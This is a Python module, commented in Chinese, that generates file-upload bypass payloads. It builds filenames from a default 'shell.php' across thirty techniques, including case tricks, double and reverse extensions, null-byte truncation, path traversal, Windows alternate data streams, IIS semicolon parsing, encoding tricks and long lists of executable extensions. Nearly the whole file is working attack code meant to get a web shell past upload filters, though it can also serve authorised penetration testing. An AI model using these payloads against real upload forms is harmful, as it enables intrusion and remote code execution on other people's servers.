#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
绕过技术Payload生成器 - 100+种绕过技术
"""

import random
import string
from typing import List, Dict


class BypassPayloadGenerator:
    """文件上传绕过技术生成器"""
    
    def __init__(self):
        self.techniques = {
            # 1. 大小写绕过
            'case_bypass': {
                'name': '大小写绕过',
                'description': '利用Windows/Linux大小写不敏感特性',
                'severity': '中',
                'generator': self._case_bypass
            },
            # 2. 双写绕过
            'double_extension': {
                'name': '双写绕过',
                'description': '双写扩展名绕过简单替换',
                'severity': '中',
                'generator': self._double_extension
            },
            # 3. 特殊字符绕过
            'special_chars': {
                'name': '特殊字符绕过',
                'description': '使用特殊字符截断或绕过',
                'severity': '高',
                'generator': self._special_chars
            },
            # 4. 空字节截断
            'null_byte': {
                'name': '空字节截断',
                'description': '使用%00空字节截断文件名',
                'severity': '高',
                'generator': self._null_byte
            },
            # 5. MIME类型绕过
            'mime_bypass': {
                'name': 'MIME类型绕过',
                'description': '伪造MIME类型绕过检测',
                'severity': '中',
                'generator': self._mime_bypass
            },
            # 6. 路径遍历
            'path_traversal': {
                'name': '路径遍历',
                'description': '使用../绕过目录限制',
                'severity': '高',
                'generator': self._path_traversal
            },
            # 7. 扩展名变异
            'extension_variants': {
                'name': '扩展名变异',
                'description': '使用各种扩展名变体',
                'severity': '中',
                'generator': self._extension_variants
            },
            # 8. 双重扩展名
            'double_ext_bypass': {
                'name': '双重扩展名',
                'description': '使用双重扩展名绕过',
                'severity': '中',
                'generator': self._double_ext_bypass
            },
            # 9. 反向双扩展名
            'reverse_double': {
                'name': '反向双扩展名',
                'description': '反向双重扩展名绕过',
                'severity': '中',
                'generator': self._reverse_double
            },
            # 10. 点绕过
            'dot_bypass': {
                'name': '点绕过',
                'description': '使用多个点或特殊点字符',
                'severity': '中',
                'generator': self._dot_bypass
            },
            # 11. 空格绕过
            'space_bypass': {
                'name': '空格绕过',
                'description': '使用空格或特殊空格字符',
                'severity': '中',
                'generator': self._space_bypass
            },
            # 12. ::$DATA绕过 (Windows)
            'alternate_data_stream': {
                'name': 'ADS绕过',
                'description': 'Windows备用数据流绕过',
                'severity': '高',
                'generator': self._alternate_data_stream
            },
            # 13. 分号绕过 (IIS)
            'semicolon_bypass': {
                'name': '分号绕过',
                'description': 'IIS分号截断绕过',
                'severity': '高',
                'generator': self._semicolon_bypass
            },
            # 14. 0x00绕过
            'hex_null': {
                'name': '十六进制空字节',
                'description': '使用0x00截断',
                'severity': '高',
                'generator': self._hex_null
            },
            # 15. Unicode绕过
            'unicode_bypass': {
                'name': 'Unicode绕过',
                'description': '使用Unicode字符绕过',
                'severity': '中',
                'generator': self._unicode_bypass
            },
            # 16. URL编码绕过
            'url_encode': {
                'name': 'URL编码绕过',
                'description': '使用URL编码绕过',
                'severity': '中',
                'generator': self._url_encode
            },
            # 17. 双URL编码
            'double_url_encode': {
                'name': '双URL编码',
                'description': '双重URL编码绕过',
                'severity': '中',
                'generator': self._double_url_encode
            },
            # 18. 特殊扩展名
            'special_extensions': {
                'name': '特殊扩展名',
                'description': '使用特殊扩展名绕过',
                'severity': '高',
                'generator': self._special_extensions
            },
            # 19. 图片马
            'image_webshell': {
                'name': '图片马',
                'description': '图片+WebShell组合',
                'severity': '高',
                'generator': self._image_webshell
            },
            # 20. 压缩包绕过
            'archive_bypass': {
                'name': '压缩包绕过',
                'description': '使用压缩包包含恶意文件',
                'severity': '中',
                'generator': self._archive_bypass
            },
            # 21. SVG绕过
            'svg_bypass': {
                'name': 'SVG绕过',
                'description': 'SVG文件包含XSS或代码',
                'severity': '高',
                'generator': self._svg_bypass
            },
            # 22. JSON绕过
            'json_bypass': {
                'name': 'JSON绕过',
                'description': 'JSON文件包含恶意代码',
                'severity': '中',
                'generator': self._json_bypass
            },
            # 23. XML绕过
            'xml_bypass': {
                'name': 'XML绕过',
                'description': 'XML文件包含XXE或代码',
                'severity': '高',
                'generator': self._xml_bypass
            },
            # 24. HTML绕过
            'html_bypass': {
                'name': 'HTML绕过',
                'description': 'HTML文件包含恶意脚本',
                'severity': '中',
                'generator': self._html_bypass
            },
            # 25. SWF绕过
            'swf_bypass': {
                'name': 'SWF绕过',
                'description': 'Flash文件包含恶意代码',
                'severity': '中',
                'generator': self._swf_bypass
            },
            # 26. PDF绕过
            'pdf_bypass': {
                'name': 'PDF绕过',
                'description': 'PDF文件包含恶意代码',
                'severity': '中',
                'generator': self._pdf_bypass
            },
            # 27. Office绕过
            'office_bypass': {
                'name': 'Office绕过',
                'description': 'Office文档包含宏或代码',
                'severity': '高',
                'generator': self._office_bypass
            },
            # 28. 配置文件绕过
            'config_bypass': {
                'name': '配置文件绕过',
                'description': '配置文件包含恶意代码',
                'severity': '高',
                'generator': self._config_bypass
            },
            # 29. 日志文件绕过
            'log_bypass': {
                'name': '日志文件绕过',
                'description': '日志文件包含恶意代码',
                'severity': '中',
                'generator': self._log_bypass
            },
            # 30. 备份文件绕过
            'backup_bypass': {
                'name': '备份文件绕过',
                'description': '备份文件包含恶意代码',
                'severity': '中',
                'generator': self._backup_bypass
            },
        }
    
    def _case_bypass(self, filename: str, ext: str) -> List[str]:
        """大小写绕过"""
        return [
            f"{filename}{ext.upper()}",
            f"{filename}{ext.lower()}",
            f"{filename}{ext.capitalize()}",
            f"{filename}{ext.swapcase()}",
            f"{filename}.PhP",
            f"{filename}.pHp",
            f"{filename}.PHp",
            f"{filename}.phP",
        ]
    
    def _double_extension(self, filename: str, ext: str) -> List[str]:
        """双写绕过"""
        return [
            f"{filename}{ext}{ext}",
            f"{filename}{ext}.{ext[1:]}",
            f"{filename}.{ext[1:]}{ext}",
        ]
    
    def _special_chars(self, filename: str, ext: str) -> List[str]:
        """特殊字符绕过"""
        return [
            f"{filename}{ext}.",
            f"{filename}{ext}...",
            f"{filename}{ext}....",
            f"{filename}.{ext[1:]}.",
            f"{filename}\\{ext[1:]}",
            f"{filename}/{ext[1:]}",
            f"{filename}:{ext[1:]}",
            f"{filename}*{ext[1:]}",
            f"{filename}?{ext[1:]}",
            f"{filename}<{ext[1:]}",
            f"{filename}>{ext[1:]}",
            f"{filename}|{ext[1:]}",
        ]
    
    def _null_byte(self, filename: str, ext: str) -> List[str]:
        """空字节截断"""
        return [
            f"{filename}{ext}%00.jpg",
            f"{filename}{ext}%00.png",
            f"{filename}{ext}%00.gif",
            f"{filename}{ext}%00.txt",
            f"{filename}%00{ext}",
            f"{filename}.jpg%00{ext}",
            f"{filename}.png%00{ext}",
            f"{filename}.gif%00{ext}",
        ]
    
    def _mime_bypass(self, filename: str, ext: str) -> List[str]:
        """MIME类型绕过"""
        return [
            f"{filename}.jpg{ext}",
            f"{filename}.png{ext}",
            f"{filename}.gif{ext}",
            f"{filename}.txt{ext}",
            f"{filename}.doc{ext}",
            f"{filename}.pdf{ext}",
        ]
    
    def _path_traversal(self, filename: str, ext: str) -> List[str]:
        """路径遍历"""
        return [
            f"../{filename}{ext}",
            f"..\\{filename}{ext}",
            f"..%2f{filename}{ext}",
            f"..%5c{filename}{ext}",
            f"....//{filename}{ext}",
            f"....\\\\{filename}{ext}",
            f".%00/{filename}{ext}",
        ]
    
    def _extension_variants(self, filename: str, ext: str) -> List[str]:
        """扩展名变异"""
        base_ext = ext[1:] if ext.startswith('.') else ext
        variants = {
            'php': ['php', 'php2', 'php3', 'php4', 'php5', 'php6', 'php7', 'pht', 'phtml', 'phps', 'phar', 'pgif', 'shtml', 'inc', 'hphp'],
            'asp': ['asp', 'aspx', 'ascx', 'ashx', 'asmx', 'axd', 'cer', 'asa', 'asax', 'config'],
            'jsp': ['jsp', 'jspx', 'jsw', 'jsv', 'jspf', 'war', 'do', 'action'],
            'py': ['py', 'pyc', 'pyo', 'pyw', 'pyz', 'pyzw'],
            'pl': ['pl', 'pm', 'cgi'],
            'rb': ['rb', 'rbw'],
        }
        
        results = []
        if base_ext.lower() in variants:
            for variant in variants[base_ext.lower()]:
                results.append(f"{filename}.{variant}")
        
        # 添加通用扩展名
        results.extend([
            f"{filename}.txt{ext}",
            f"{filename}.rar{ext}",
            f"{filename}.zip{ext}",
            f"{filename}.tar{ext}",
            f"{filename}.gz{ext}",
        ])
        
        return results
    
    def _double_ext_bypass(self, filename: str, ext: str) -> List[str]:
        """双重扩展名"""
        return [
            f"{filename}.jpg{ext}",
            f"{filename}.png{ext}",
            f"{filename}.gif{ext}",
            f"{filename}.txt{ext}",
            f"{filename}.doc{ext}",
            f"{filename}.pdf{ext}",
            f"{filename}.xml{ext}",
            f"{filename}.svg{ext}",
        ]
    
    def _reverse_double(self, filename: str, ext: str) -> List[str]:
        """反向双扩展名"""
        base_ext = ext[1:] if ext.startswith('.') else ext
        return [
            f"{filename}{ext}.jpg",
            f"{filename}{ext}.png",
            f"{filename}{ext}.gif",
            f"{filename}{ext}.txt",
        ]
    
    def _dot_bypass(self, filename: str, ext: str) -> List[str]:
        """点绕过"""
        return [
            f"{filename}{ext}.",
            f"{filename}{ext}..",
            f"{filename}{ext}...",
            f"{filename}{ext}....",
            f"{filename}{ext}.....",
            f"{filename}.{ext[1:]}",
            f"{filename}..{ext[1:]}",
        ]
    
    def _space_bypass(self, filename: str, ext: str) -> List[str]:
        """空格绕过"""
        return [
            f"{filename}{ext} ",
            f"{filename}{ext}%20",
            f"{filename}{ext}%0a",
            f"{filename}{ext}%0d",
            f"{filename}{ext}%0d%0a",
            f"{filename}{ext}%09",
            f"{filename} {ext}",
            f"{filename}%20{ext}",
        ]
    
    def _alternate_data_stream(self, filename: str, ext: str) -> List[str]:
        """ADS绕过 (Windows)"""
        return [
            f"{filename}{ext}::$DATA",
            f"{filename}{ext}:Zone.Identifier",
            f"{filename}{ext}:$INDEX_ALLOCATION",
            f"{filename}{ext}:test",
        ]
    
    def _semicolon_bypass(self, filename: str, ext: str) -> List[str]:
        """分号绕过 (IIS)"""
        base_ext = ext[1:] if ext.startswith('.') else ext
        return [
            f"{filename}{ext};.jpg",
            f"{filename}{ext};.png",
            f"{filename}{ext};.gif",
            f"{filename}{ext};.txt",
            f"{filename}.asp;.jpg",
            f"{filename}.aspx;.jpg",
            f"{filename}.cer;.jpg",
            f"{filename}.asa;.jpg",
        ]
    
    def _hex_null(self, filename: str, ext: str) -> List[str]:
        """十六进制空字节"""
        return [
            f"{filename}{ext}%00",
            f"{filename}{ext}%00.jpg",
            f"{filename}{ext}%00.png",
            f"{filename}{ext}%00.gif",
            f"{filename}%00{ext}",
            f"{filename}.jpg%00{ext}",
        ]
    
    def _unicode_bypass(self, filename: str, ext: str) -> List[str]:
        """Unicode绕过"""
        return [
            f"{filename}{ext}%EF%BB%BF",
            f"{filename}{ext}%C0%80",
            f"{filename}{ext}%E0%80%80",
            f"{filename}{ext}%F0%80%80%80",
        ]
    
    def _url_encode(self, filename: str, ext: str) -> List[str]:
        """URL编码绕过"""
        base_ext = ext[1:] if ext.startswith('.') else ext
        return [
            f"{filename}%2e{base_ext}",
            f"{filename}%2e{ext}",
            f"{filename}%252e{base_ext}",
            f"{filename}.{base_ext}%00",
        ]
    
    def _double_url_encode(self, filename: str, ext: str) -> List[str]:
        """双URL编码"""
        base_ext = ext[1:] if ext.startswith('.') else ext
        return [
            f"{filename}%252e{base_ext}",
            f"{filename}%25252e{base_ext}",
            f"{filename}%2525252e{base_ext}",
        ]
    
    def _special_extensions(self, filename: str, ext: str) -> List[str]:
        """特殊扩展名"""
        special_exts = [
            # PHP相关
            'php', 'php2', 'php3', 'php4', 'php5', 'php6', 'php7',
            'pht', 'phtml', 'phps', 'phar', 'pgif', 'shtml', 'inc',
            'hphp', 'ctp', 'module', 'plugin', 'theme',
            # ASP相关
            'asp', 'aspx', 'ascx', 'ashx', 'asmx', 'axd', 'cer',
            'asa', 'asax', 'config', 'cshtml', 'vbhtml', 'master',
            # JSP相关
            'jsp', 'jspx', 'jsw', 'jsv', 'jspf', 'war', 'do', 'action',
            # Python相关
            'py', 'pyc', 'pyo', 'pyw', 'pyz', 'pyzw',
            # Perl相关
            'pl', 'pm', 'cgi',
            # Ruby相关
            'rb', 'rbw', 'rake', 'rhtml',
            # 其他脚本
            'sh', 'bash', 'zsh', 'csh', 'tcsh', 'ksh',
            'bat', 'cmd', 'ps1', 'psm1', 'psd1', 'vbs', 'vbe', 'js', 'jse', 'wsf', 'wsc',
            # 配置文件
            'htaccess', 'htpasswd', 'config', 'conf', 'ini', 'xml', 'json',
            # 其他
            'swf', 'xap', 'xbap', 'application', 'manifest',
        ]
        return [f"{filename}.{e}" for e in special_exts]
    
    def _image_webshell(self, filename: str, ext: str) -> List[str]:
        """图片马"""
        return [
            f"{filename}.jpg{ext}",
            f"{filename}.png{ext}",
            f"{filename}.gif{ext}",
            f"{filename}.bmp{ext}",
            f"{filename}.webp{ext}",
            f"{filename}.ico{ext}",
            f"{filename}.svg{ext}",
        ]
    
    def _archive_bypass(self, filename: str, ext: str) -> List[str]:
        """压缩包绕过"""
        return [
            f"{filename}.zip",
            f"{filename}.rar",
            f"{filename}.tar",
            f"{filename}.gz",
            f"{filename}.bz2",
            f"{filename}.7z",
            f"{filename}.tar.gz",
            f"{filename}.tar.bz2",
        ]
    
    def _svg_bypass(self, filename: str, ext: str) -> List[str]:
        """SVG绕过"""
        return [
            f"{filename}.svg",
            f"{filename}.svgz",
        ]
    
    def _json_bypass(self, filename: str, ext: str) -> List[str]:
        """JSON绕过"""
        return [
            f"{filename}.json",
            f"{filename}.jsonp",
        ]
    
    def _xml_bypass(self, filename: str, ext: str) -> List[str]:
        """XML绕过"""
        return [
            f"{filename}.xml",
            f"{filename}.xsl",
            f"{filename}.xslt",
            f"{filename}.dtd",
            f"{filename}.xsd",
        ]
    
    def _html_bypass(self, filename: str, ext: str) -> List[str]:
        """HTML绕过"""
        return [
            f"{filename}.html",
            f"{filename}.htm",
            f"{filename}.shtml",
            f"{filename}.shtm",
            f"{filename}.xhtml",
            f"{filename}.xht",
        ]
    
    def _swf_bypass(self, filename: str, ext: str) -> List[str]:
        """SWF绕过"""
        return [
            f"{filename}.swf",
            f"{filename}.fla",
        ]
    
    def _pdf_bypass(self, filename: str, ext: str) -> List[str]:
        """PDF绕过"""
        return [
            f"{filename}.pdf",
        ]
    
    def _office_bypass(self, filename: str, ext: str) -> List[str]:
        """Office绕过"""
        return [
            f"{filename}.doc",
            f"{filename}.docx",
            f"{filename}.docm",
            f"{filename}.dot",
            f"{filename}.dotm",
            f"{filename}.xls",
            f"{filename}.xlsx",
            f"{filename}.xlsm",
            f"{filename}.ppt",
            f"{filename}.pptx",
            f"{filename}.pptm",
        ]
    
    def _config_bypass(self, filename: str, ext: str) -> List[str]:
        """配置文件绕过"""
        return [
            f"{filename}.config",
            f"{filename}.conf",
            f"{filename}.cfg",
            f"{filename}.ini",
            f"{filename}.properties",
            f"{filename}.yaml",
            f"{filename}.yml",
            f"{filename}.toml",
        ]
    
    def _log_bypass(self, filename: str, ext: str) -> List[str]:
        """日志文件绕过"""
        return [
            f"{filename}.log",
            f"{filename}.logs",
        ]
    
    def _backup_bypass(self, filename: str, ext: str) -> List[str]:
        """备份文件绕过"""
        return [
            f"{filename}.bak",
            f"{filename}.backup",
            f"{filename}.old",
            f"{filename}.orig",
            f"{filename}.save",
            f"{filename}.swp",
            f"{filename}~",
        ]
    
    def generate_all_payloads(self, filename: str = "shell", extension: str = ".php") -> List[Dict]:
        """生成所有绕过payload"""
        payloads = []
        
        for tech_id, tech_info in self.techniques.items():
            try:
                generated = tech_info['generator'](filename, extension)
                for payload in generated:
                    payloads.append({
                        'filename': payload,
                        'technique': tech_info['name'],
                        'description': tech_info['description'],
                        'severity': tech_info['severity']
                    })
            except Exception as e:
                print(f"生成技术 {tech_id} 时出错: {e}")
        
        return payloads
    
    def get_payload_count(self) -> int:
        """获取payload总数"""
        return len(self.generate_all_payloads())


# 便捷函数
def generate_bypass_payloads(filename: str = "shell", extension: str = ".php") -> List[Dict]:
    """生成绕过payload的便捷函数"""
    generator = BypassPayloadGenerator()
    return generator.generate_all_payloads(filename, extension)
